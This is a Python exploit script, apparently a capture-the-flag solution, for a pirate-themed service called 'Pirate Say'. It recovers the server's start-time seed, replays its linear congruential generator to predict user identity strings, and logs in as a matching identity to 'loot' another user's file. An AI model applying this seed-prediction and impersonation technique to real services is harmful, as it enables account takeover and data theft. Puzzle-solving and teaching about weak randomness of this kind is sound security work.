import asyncio
import re
import socket
import time

directories = [
    "BlackbeardCove",
    "TreasureIsland",
    "SkullAndBonesReef",
    "DeadMansBay",
    "JollyRogersHarbor",
    "BuccaneerBeach",
    "PirateHideout",
    "CutthroatCreek",
    "SirenShores",
    "CorsairCastle",
    "WickedWaters",
    "MaroonersLagoon",
    "ParrotPerch",
    "RumRunnersRidge",
    "GalleonGraveyard"
]

pirate_adjectives = [
    "Red", "Black", "Silver", "Golden", "Scarlet", "Dark", "White", "Blue", "Rogue", "Stormy",
    "Fearsome", "Mighty", "Brave", "Savage", "Fiery", "Cunning", "Bold", "Fierce", "Grim", "Vengeful",
    "Merciless", "Wild", "Daring", "Stealthy", "Ferocious", "Deadly", "Bloodthirsty", "Cruel", "Relentless", "Treacherous",
    "Wrathful", "Ruthless", "Sinister", "Ghostly", "Iron", "Steel", "Thunderous", "Shadowy", "Mysterious", "Menacing",
    "Dauntless", "Unyielding", "Reckless", "Savvy", "Fearless", "Intrepid", "Grizzled", "Vigilant", "Crafty", "Sly",
    "Swift", "Dreadful", "Gallant", "Heroic", "Legendary", "Wicked", "Terrorizing", "Formidable", "Chaotic", "Brutal",
    "Perilous", "Noble", "Valiant", "Infernal", "Monstrous", "Raging", "Vicious", "Sinful", "Boldhearted", "Ferocious",
    "Indomitable", "Savage", "Dreaded", "Fabled", "Majestic", "Unstoppable", "Ancient", "Stalwart", "Mythic", "Untamed",
    "Mystic", "Prowling", "Doomed", "Forgotten", "Seafaring", "Wandering", "Shadow", "Deepsea", "Stormborn", "Windrider",
    "Tidal", "Maelstrom", "Typhoon", "Tempest", "Harpooner", "Corsair", "Buccaneer", "Seawolf", "SeaSerpent", "Kraken"
]
pirate_nouns = [
    "Beard", "Jack", "Bart", "Pete", "Anne", "Patty", "John", "Hook", "Bill", "Bonny",
    "Morgan", "Davy", "Blackbeard", "Silver", "LongJohn", "Calico", "Rackham", "Teach", "Drake", "Roberts",
    "Lafitte", "Vane", "Flint", "Kidd", "Bartholomew", "Edward", "Mary", "Jane", "Blood", "Cannon",
    "Cutlass", "Sparrow", "Corsair", "Marooner", "SeaDog", "Scallywag", "Buccaneer", "SeaWolf", "Privateer", "Matey",
    "Swashbuckler", "Skull", "Crossbones", "Treasure", "Galleon", "Parrot", "Pistol", "Rum", "Sloop", "Brig",
    "PirateKing", "Siren", "Corsair", "JollyRoger", "Bounty", "Scourge", "SeaSerpent", "Kraken", "Marauder", "Plunder",
    "Loot", "Booty", "BountyHunter", "Mutineer", "Captain", "Quartermaster", "Gunner", "Boatswain", "Lookout", "Sailor",
    "Navigator", "FirstMate", "Shipwright", "PowderMonkey", "CabinBoy", "Deckhand", "Helmsman", "Longboat", "Cannoneer", "Shipmate",
    "PirateQueen", "SeaRover", "SeaRaider", "SeaCaptain", "Freebooter", "Wench", "Swabber", "Harpooner", "SeaWitch", "Buoy",
    "Gangplank", "Mainmast", "Crowsnest", "Forecastle", "Hold", "Broadside", "Bilge", "Grog", "Anchor", "Tide"
]

NUM_ADJECTIVES = len(pirate_adjectives)
NUM_NOUNS = len(pirate_nouns)
IDENTITY_LENGTH = 64

# Linear Congruential Generator parameters
A = 1103515245
C = 12345
M = 2147483648  # 2^31

def lcgrand(seed):
    return (A * seed + C) % M

def generate_identity_string(seed):
    current_seed = seed  # Initialize the current seed
    identity_string = ''
    for _ in range(IDENTITY_LENGTH):
        current_seed = lcgrand(current_seed)  # Update the seed
        identity_string += chr(ord('a') + (current_seed % 26))
    return identity_string, current_seed  # Return both the identity string and the final seed

def get_unix_time_from_string(date_string):
    # Format of date_string: "2024-07-15 11:35:24"
    return int(time.mktime(time.strptime(date_string, "%Y-%m-%d %H:%M:%S")))

def get_adjective_from_identity(identity_string):
    hash = 5381
    for c in identity_string:
        hash = ((hash << 5) + hash) + ord(c)  # hash * 33 + ord(c)
        hash = hash & 0xFFFFFFFF  # Ensure hash is a 32-bit unsigned integer
    index = hash % NUM_ADJECTIVES
    return pirate_adjectives[index]

def get_noun_from_identity(identity_string):
    hash = 5381
    for c in identity_string:
        hash = ((hash << 5) + hash) + ord(c)  # hash * 33 + ord(c)
        hash = hash & 0xFFFFFFFF  # Ensure hash is a 32-bit unsigned integer
    index = (hash >> 16) % NUM_NOUNS  # Shift to get a different part of the hash
    return pirate_nouns[index]

# Establish a single connection to get the seed and current identity

def get_seed_and_current_identity(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        
        # Receive the initial server message
        def recv_until_prompt(prompt):
            data = b''
            while not data.endswith(prompt):
                data += s.recv(1024)
            return data

        initial_message = recv_until_prompt(b'$ ').decode()
        # Extract the timestamp from the initial message
        match = re.search(r'\(Pirate Say v1.0.0, up since (.+?)\)', initial_message)
        if match:
            seed_string = match.group(1)
            seed = get_unix_time_from_string(seed_string)
        else:
            print("Failed to extract seed from server message")
            exit(1)

        # Get the current identity
        s.sendall(b'identity\n')
        identity_response = recv_until_prompt(b': ').decode()
        s.sendall(b'\n')  # Keeping current identity
        recv_until_prompt(b'$ ')
        current_identity = identity_response.split("\n")[0].split(":")[1].strip()

        return seed, current_identity

# Get potential identities between seed and current identity
def get_potential_identites(seed, current_identity):
    
    potential_identities = []
    N = 30000
    while True:
        identity_string, seed = generate_identity_string(seed)
        potential_identities.append(identity_string)

        if identity_string == current_identity:
            break
    
    return potential_identities

def get_matching_identites(potential_identities, target_file):

    # Extract the name from the target_file
    target_name = target_file.split('_found_shipwreck')[0]

    # Filter to get those that match the target name
    matching_identities = []
    for identity in potential_identities:
        adj = get_adjective_from_identity(identity)
        noun = get_noun_from_identity(identity)
        scammer_name = f"{adj}{noun}"
        scammer_name = re.sub(r'(?<=[a-z])(?=[A-Z])', '_', scammer_name).lower()
        if scammer_name in target_name:
            matching_identities.append(identity)
    
    return matching_identities

async def process_identity_async(identity, target_file, target_directory, host, port):
    reader, writer = await asyncio.open_connection(host, port)

    async def recv_until_prompt(prompt):
        data = b''
        while not data.endswith(prompt):
            chunk = await reader.read(1024)
            if not chunk:
                break
            data += chunk
        return data

    writer.write(b'identity\n')
    await writer.drain()
    await recv_until_prompt(b': ')
    
    writer.write(identity.encode() + b'\n')
    await writer.drain()
    await recv_until_prompt(b'$ ')

    writer.write(f'sail {target_directory}\n'.encode())
    await writer.drain()
    await recv_until_prompt(b'$ ')
    
    writer.write(f'loot {target_file}\n'.encode())
    await writer.drain()
    response = await recv_until_prompt(b'$ ')
    
    writer.close()
    await writer.wait_closed()
    
    return response
